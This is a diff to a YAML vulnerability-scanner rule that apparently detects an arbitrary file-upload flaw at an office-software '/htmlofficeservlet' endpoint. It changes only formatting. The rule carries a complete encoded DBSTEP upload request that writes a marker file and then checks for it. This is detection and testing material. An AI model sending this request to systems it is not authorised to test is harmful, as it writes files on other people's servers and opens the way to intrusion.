@@ -3,7 +3,7 @@ rules:
   - method: POST
     path: /htmlofficeservlet
     headers:
-      Content-Type: 1
+      Content-Type: '1'
     body: "DBSTEP V3.0     355             0               666            \r\nDBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATddAS5NrJ3\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\na6e4f045d4b8506bf492ada7e3390d7ce"
     follow_redirects: false
     expression: |
@@ -13,7 +13,6 @@ rules:
     follow_redirects: false
     expression: |
       status == 200 && body.bcontains(b'da7e3390d7ce')
-
 detail:
     author: timwhite
     links:
